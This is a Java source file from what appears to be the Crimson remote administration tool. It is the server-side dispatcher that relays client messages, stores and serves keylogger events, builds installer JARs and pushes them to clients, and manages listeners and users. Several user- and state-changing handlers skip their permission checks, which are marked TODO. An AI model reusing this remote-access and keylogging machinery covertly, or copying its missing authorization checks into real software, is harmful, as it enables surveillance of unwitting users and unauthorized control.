/******************************************************************************
 *                                                                            *
 *                    Copyright 2016 Subterranean Security                    *
 *                                                                            *
 *  Licensed under the Apache License, Version 2.0 (the "License");           *
 *  you may not use this file except in compliance with the License.          *
 *  You may obtain a copy of the License at                                   *
 *                                                                            *
 *      http://www.apache.org/licenses/LICENSE-2.0                            *
 *                                                                            *
 *  Unless required by applicable law or agreed to in writing, software       *
 *  distributed under the License is distributed on an "AS IS" BASIS,         *
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
 *  See the License for the specific language governing permissions and       *
 *  limitations under the License.                                            *
 *                                                                            *
 *****************************************************************************/
package com.subterranean_security.crimson.server.net;

import static com.subterranean_security.crimson.universal.Flags.LOG_NET;

import java.util.Date;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.google.protobuf.ByteString;
import com.subterranean_security.crimson.core.attribute.keys.singular.AKeySimple;
import com.subterranean_security.crimson.core.misc.AuthenticationGroup;
import com.subterranean_security.crimson.core.net.Connector.ConnectionState;
import com.subterranean_security.crimson.core.net.executor.BasicExecutor;
import com.subterranean_security.crimson.core.store.ConnectionStore;
import com.subterranean_security.crimson.core.store.NetworkStore;
import com.subterranean_security.crimson.core.stream.StreamStore;
import com.subterranean_security.crimson.core.stream.subscriber.SubscriberSlave;
import com.subterranean_security.crimson.core.util.CryptoUtil;
import com.subterranean_security.crimson.core.util.ProtoUtil;
import com.subterranean_security.crimson.proto.core.Generator.GenReport;
import com.subterranean_security.crimson.proto.core.Misc.Outcome;
import com.subterranean_security.crimson.proto.core.net.sequences.ClientAuth.RQ_GroupChallenge;
import com.subterranean_security.crimson.proto.core.net.sequences.ClientAuth.RS_CreateAuthMethod;
import com.subterranean_security.crimson.proto.core.net.sequences.ClientAuth.RS_GroupChallenge;
import com.subterranean_security.crimson.proto.core.net.sequences.ClientAuth.RS_RemoveAuthMethod;
import com.subterranean_security.crimson.proto.core.net.sequences.Delta.EV_ProfileDelta;
import com.subterranean_security.crimson.proto.core.net.sequences.Delta.EV_ServerProfileDelta;
import com.subterranean_security.crimson.proto.core.net.sequences.Delta.EV_ViewerProfileDelta;
import com.subterranean_security.crimson.proto.core.net.sequences.Generator.RS_Generate;
import com.subterranean_security.crimson.proto.core.net.sequences.Keylogger.EV_KEvent;
import com.subterranean_security.crimson.proto.core.net.sequences.Keylogger.RQ_KeyUpdate;
import com.subterranean_security.crimson.proto.core.net.sequences.Keylogger.RS_KeyUpdate;
import com.subterranean_security.crimson.proto.core.net.sequences.Log.LogFile;
import com.subterranean_security.crimson.proto.core.net.sequences.Log.LogType;
import com.subterranean_security.crimson.proto.core.net.sequences.Log.RS_Logs;
import com.subterranean_security.crimson.proto.core.net.sequences.Login.RS_Ping;
import com.subterranean_security.crimson.proto.core.net.sequences.MSG.Message;
import com.subterranean_security.crimson.proto.core.net.sequences.State.RS_ChangeServerState;
import com.subterranean_security.crimson.proto.core.net.sequences.Stream.EV_EndpointClosed;
import com.subterranean_security.crimson.proto.core.net.sequences.Stream.Param;
import com.subterranean_security.crimson.proto.core.net.sequences.Users.RQ_AddUser;
import com.subterranean_security.crimson.proto.core.net.sequences.Users.RS_AddUser;
import com.subterranean_security.crimson.proto.core.net.sequences.Users.RS_EditUser;
import com.subterranean_security.crimson.sc.Logsystem;
import com.subterranean_security.crimson.server.Generator;
import com.subterranean_security.crimson.server.net.exe.AuthExe;
import com.subterranean_security.crimson.server.net.exe.CvidExe;
import com.subterranean_security.crimson.server.net.exe.DeltaExe;
import com.subterranean_security.crimson.server.net.exe.FileManagerExe;
import com.subterranean_security.crimson.server.net.exe.LoginExe;
import com.subterranean_security.crimson.server.net.exe.NetworkExe;
import com.subterranean_security.crimson.server.net.exe.ServerInfoExe;
import com.subterranean_security.crimson.server.net.stream.SInfoSlave;
import com.subterranean_security.crimson.server.store.AuthStore;
import com.subterranean_security.crimson.server.store.ListenerStore;
import com.subterranean_security.crimson.server.store.ServerDatabaseStore;
import com.subterranean_security.crimson.server.store.ServerProfileStore;
import com.subterranean_security.crimson.sv.permissions.Perm;
import com.subterranean_security.crimson.sv.permissions.ViewerPermissions;
import com.subterranean_security.crimson.sv.profile.ClientProfile;
import com.subterranean_security.crimson.sv.profile.ViewerProfile;
import com.subterranean_security.crimson.universal.Universal;

import io.netty.util.ReferenceCountUtil;

public class ServerExecutor extends BasicExecutor {
	private static final Logger log = LoggerFactory.getLogger(ServerExecutor.class);

	public ServerExecutor() {
		super();

		dispatchThread = new Thread(new Runnable() {
			public void run() {
				while (!Thread.interrupted()) {
					Message m;
					try {
						m = connector.msgQueue.take();
					} catch (InterruptedException e) {
						return;
					}
					pool.submit(() -> {
						if (LOG_NET)
							log.debug("INCOMING\n{}/INCOMING", m.toString());

						if (m.getRid() != 0) {
							// route
							try {
								ConnectionStore.get(m.getRid()).write(m);
							} catch (NullPointerException e) {
								log.debug("Could not forward message to CVID: {}", m.getRid());
								connector.write(Message.newBuilder()
										.setEvEndpointClosed(EV_EndpointClosed.newBuilder().setCVID(m.getRid()))
										.build());
							}
						}

						switch (m.getMsgOneofCase()) {
						case EV_KEVENT:
							ev_kevent(m);
							break;
						case EV_PROFILE_DELTA:
							DeltaExe.ev_profileDelta(connector, m.getEvProfileDelta());
							break;
						case MI_AUTH_REQUEST:
							AuthExe.mi_auth_request(connector, m);
							break;
						case MI_CHALLENGE_RESULT:
							AuthExe.mi_challenge_result(connector, m);
							break;
						case MI_STREAM_START:
							mi_stream_start(m);
							break;
						case MI_STREAM_STOP:
							mi_stream_stop(m);
							break;
						case MI_TRIGGER_PROFILE_DELTA:
							DeltaExe.mi_trigger_profile_delta(connector, m);
							break;
						case RQ_ADD_LISTENER:
							rq_add_listener(m);
							break;
						case RQ_ADD_USER:
							rq_add_user(m);
							break;
						case RQ_ADVANCED_FILE_INFO:
							FileManagerExe.rq_advanced_file_info(connector, m);
							break;
						case RQ_CREATE_AUTH_METHOD:
							rq_create_auth_method(m);
							break;
						case RQ_CVID:
							CvidExe.rq_cvid(connector, m);
							break;
						case RQ_DELETE:
							FileManagerExe.rq_delete(connector, m);
							break;
						case RQ_DIRECT_CONNECTION:
							NetworkExe.rq_direct_connection(connector, m);
							break;
						case RQ_EDIT_USER:
							rq_edit_user(m);
							break;
						case RQ_FILE_HANDLE:
							FileManagerExe.rq_file_handle(connector, m);
							break;
						case RQ_FILE_LISTING:
							FileManagerExe.rq_file_listing(connector, m);
							break;
						case RQ_GENERATE:
							rq_generate(m);
							break;
						case RQ_GROUP_CHALLENGE:
							rq_group_challenge(m);
							break;
						case RQ_KEY_UPDATE:
							rq_key_update(m);
							break;
						case RQ_LOGIN:
							LoginExe.rq_login(connector, m);
							break;
						case RQ_LOGS:
							rq_logs(m);
							break;
						case RQ_PING:
							connector.write(Message.newBuilder().setRsPing(RS_Ping.newBuilder()).build());
							break;
						case RQ_REMOVE_AUTH_METHOD:
							rq_remove_auth_method(m);
							break;
						case RQ_REMOVE_LISTENER:
							rq_remove_listener(m);
							break;
						case RQ_SERVER_INFO:
							ServerInfoExe.rq_server_info(connector);
							break;
						case RS_CHANGE_CLIENT_STATE:
							rq_change_client_state(m);
							break;
						case RS_CHANGE_SERVER_STATE:
							rq_change_server_state(m);
							break;
						case RS_FILE_HANDLE:
							FileManagerExe.rs_file_handle(connector, m);
							break;
						case RS_FILE_LISTING:
							FileManagerExe.rs_file_listing(connector, m);
							break;
						default:
							// TODO potential race condition: A thread may
							// be waiting for a certain ID and an
							// unauthenticated message could arrive before
							// the intended response, causing a
							// MessageFlowException
							connector.addNewResponse(m);
							break;

						}

						ReferenceCountUtil.release(m);
					});
				}
			}
		});

	}

	private void ev_kevent(Message m) {
		try {
			ServerProfileStore.getClient(connector.getCvid()).getKeylog().addEvent(m.getEvKevent());
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}

	private void mi_stream_start(Message m) {

		Param p = m.getMiStreamStart().getParam();
		if (p.hasInfoParam()) {
			StreamStore.addStream(new SInfoSlave(p));
		}
		if (p.hasSubscriberParam()) {
			StreamStore.addStream(new SubscriberSlave(p));
		}

	}

	private void mi_stream_stop(Message m) {
		StreamStore.removeStreamBySID(m.getMiStreamStop().getStreamID());
	}

	private void rq_key_update(Message m) {
		RQ_KeyUpdate rq = m.getRqKeyUpdate();
		Date target = new Date(rq.getStartDate());

		// check permissions
		if (!ServerProfileStore.getViewer(connector.getCvid()).getPermissions().getFlag(rq.getCid(),
				Perm.client.keylogger.read_logs)) {
			connector.write(Message.newBuilder().setId(m.getId())
					.setRsKeyUpdate(RS_KeyUpdate.newBuilder().setResult(false)).build());
			return;
		}

		ClientProfile cp = ServerProfileStore.getClient(rq.getCid());
		if (cp != null) {
			for (EV_KEvent k : cp.getKeylog().getEventsAfter(target)) {
				connector.write(Message.newBuilder().setSid(rq.getCid()).setEvKevent(k).build());
			}
			connector.write(Message.newBuilder().setId(m.getId())
					.setRsKeyUpdate(RS_KeyUpdate.newBuilder().setResult(true)).build());
		} else {
			connector.write(Message.newBuilder().setId(m.getId())
					.setRsKeyUpdate(RS_KeyUpdate.newBuilder().setResult(false)).build());
		}

	}

	private void rq_group_challenge(Message m) {
		if (connector.getState() != ConnectionState.AUTH_STAGE2) {
			return;
		}
		RQ_GroupChallenge rq = m.getRqGroupChallenge();
		AuthenticationGroup group = AuthStore.getGroup(rq.getGroupName());

		RS_GroupChallenge rs = RS_GroupChallenge.newBuilder()
				.setResult(CryptoUtil.signGroupChallenge(rq.getMagic(), group.getPrivateKey())).build();
		connector.write(Message.newBuilder().setId(m.getId()).setRsGroupChallenge(rs).build());
		try {
			Thread.sleep(100);
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}

	private void rq_generate(Message m) {

		// check permissions
		if (!ServerProfileStore.getViewer(connector.getCvid()).getPermissions()
				.getFlag(Perm.server.generator.generate_jar)) {
			connector.write(Message.newBuilder().setId(m.getId())
					.setRsGenerate(RS_Generate.newBuilder()
							.setReport(GenReport.newBuilder().setResult(false).setComment("Insufficient permissions")))
					.build());
			return;
		}

		byte[] res = null;
		Generator g = new Generator();
		try {
			if (m.getRqGenerate().getSendToCid() != 0) {
				g.generate(m.getRqGenerate().getInternalConfig(), m.getRqGenerate().getSendToCid());
			} else {
				g.generate(m.getRqGenerate().getInternalConfig());
			}

			res = g.getResult();

			RS_Generate.Builder rs = RS_Generate.newBuilder().setInstaller(ByteString.copyFrom(res))
					.setReport(g.getReport());

			if (m.getRqGenerate().getSendToCid() != 0) {
				ConnectionStore.get(m.getRqGenerate().getSendToCid())
						.write(Message.newBuilder().setRsGenerate(rs).build());
				connector.write(Message.newBuilder().setId(m.getId())
						.setRsGenerate(RS_Generate.newBuilder().setReport(g.getReport())).build());
			} else {
				connector.write(Message.newBuilder().setId(m.getId()).setRsGenerate(rs).build());
			}
		} catch (Exception e) {
			connector.write(Message.newBuilder().setId(m.getId())
					.setRsGenerate(RS_Generate.newBuilder().setReport(g.getReport())).build());
		}

	}

	private void rq_add_listener(Message m) {
		// check permissions
		if (!ServerProfileStore.getViewer(connector.getCvid()).getPermissions()
				.getFlag(Perm.server.network.create_listener)) {
			connector.write(Message.newBuilder().setId(m.getId())
					.setRsOutcome(Outcome.newBuilder().setResult(false).setComment("Insufficient permissions"))
					.build());
			return;
		}

		connector.write(
				Message.newBuilder().setId(m.getId()).setRsOutcome(Outcome.newBuilder().setResult(true)).build());
		ListenerStore.add(m.getRqAddListener().getConfig());
		Message update = Message.newBuilder().setEvServerProfileDelta(
				EV_ServerProfileDelta.newBuilder().addListener(m.getRqAddListener().getConfig())).build();
		NetworkStore.broadcastTo(Universal.Instance.VIEWER, update);

	}

	private void rq_remove_listener(Message m) {

	}

	private void rq_add_user(Message m) {
		// TODO check permissions
		connector.write(
				Message.newBuilder().setId(m.getId()).setRsAddUser(RS_AddUser.newBuilder().setResult(true)).build());

		ServerDatabaseStore.getDatabase().addLocalUser(m.getRqAddUser().getUser(), m.getRqAddUser().getPassword(),
				new ViewerPermissions(m.getRqAddUser().getPermissionsList()));

		Message update = Message.newBuilder()
				.setEvViewerProfileDelta(EV_ViewerProfileDelta.newBuilder()
						.addAllViewerPermissions(m.getRqAddUser().getPermissionsList())
						.setPd(EV_ProfileDelta.newBuilder()
								.addGroup(ProtoUtil.getNewGeneralGroup()
										.putAttribute(AKeySimple.VIEWER_USER.getFullID(), m.getRqAddUser().getUser()))))
				.build();
		NetworkStore.broadcastTo(Universal.Instance.VIEWER, update);

	}

	private void rq_edit_user(Message m) {
		// TODO check permissions
		connector.write(
				Message.newBuilder().setId(m.getId()).setRsEditUser(RS_EditUser.newBuilder().setResult(true)).build());

		RQ_AddUser rqad = m.getRqEditUser().getUser();

		ViewerProfile vp = null;

		try {
			vp = ServerProfileStore.getViewer(rqad.getUser());
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

		EV_ViewerProfileDelta.Builder b = EV_ViewerProfileDelta.newBuilder()
				.setPd(EV_ProfileDelta.newBuilder().addGroup(ProtoUtil.getNewGeneralGroup()
						.putAttribute(AKeySimple.VIEWER_USER.getFullID(), rqad.getUser())))
				.addAllViewerPermissions(m.getRqAddUser().getPermissionsList());

		if (rqad.getPermissionsCount() != 0) {
			vp.getPermissions().add(rqad.getPermissionsList());
			b.addAllViewerPermissions(rqad.getPermissionsList());
		}

		if (rqad.hasPassword() && ServerDatabaseStore.getDatabase().validLogin(rqad.getUser(),
				CryptoUtil.hashCrimsonPassword(m.getRqEditUser().getOldPassword(),
						ServerDatabaseStore.getDatabase().getSalt(rqad.getUser())))) {
			ServerDatabaseStore.getDatabase().changePassword(rqad.getUser(), rqad.getPassword());

		}

		Message update = Message.newBuilder().setEvViewerProfileDelta(b).build();

		NetworkStore.broadcastTo(Universal.Instance.VIEWER, update);

	}

	private void rq_change_server_state(Message m) {
		// TODO check permissions
		String comment = "";
		boolean result = true;

		switch (m.getRqChangeServerState().getNewState()) {
		case FUNCTIONING_OFF:
			ListenerStore.stopAll();
			break;
		case FUNCTIONING_ON:
			ListenerStore.startAll();
			break;
		case RESTART:
			break;
		case SHUTDOWN:
			break;
		case UNINSTALL:
			break;
		default:
			break;
		}

		connector.write(Message.newBuilder().setId(m.getId()).setRsChangeServerState(RS_ChangeServerState.newBuilder()
				.setOutcome(Outcome.newBuilder().setResult(result).setComment(comment))).build());

		// notify viewers
		NetworkStore.broadcastTo(Universal.Instance.VIEWER,
				Message.newBuilder()
						.setEvServerProfileDelta(EV_ServerProfileDelta.newBuilder()
								.setPd(EV_ProfileDelta.newBuilder()
										.addGroup(ProtoUtil.getNewGeneralGroup()
												.putAttribute(AKeySimple.SERVER_ACTIVE_LISTENERS.getFullID(),
														"" + ListenerStore.getActive())
												.putAttribute(AKeySimple.SERVER_INACTIVE_LISTENERS.getFullID(),
														"" + ListenerStore.getInactive()))))
						.build());
	}

	private void rq_change_client_state(Message m) {

	}

	private void rq_create_auth_method(Message m) {
		Outcome outcome = AuthStore.create(m.getRqCreateAuthMethod().getAuthMethod());

		connector.write(Message.newBuilder().setId(m.getId())
				.setRsCreateAuthMethod(RS_CreateAuthMethod.newBuilder().setOutcome(outcome)).build());

	}

	private void rq_remove_auth_method(Message m) {
		AuthStore.remove(m.getRqRemoveAuthMethod().getId());
		// TODO check if removed
		connector.write(
				Message.newBuilder().setRsRemoveAuthMethod(RS_RemoveAuthMethod.newBuilder().setResult(true)).build());
	}

	private void rq_logs(Message m) {
		RS_Logs.Builder rs = RS_Logs.newBuilder();
		if (m.getRqLogs().hasLog()) {
			rs.addLog(LogFile.newBuilder().setName(m.getRqLogs().getLog())
					.setLog(Logsystem.getLog(m.getRqLogs().getLog())));
		} else {
			for (LogType lt : Logsystem.getApplicableLogs()) {
				rs.addLog(LogFile.newBuilder().setName(lt).setLog(Logsystem.getLog(lt)));
			}
		}
		connector.write(Message.newBuilder().setRsLogs(rs).build());
	}

}
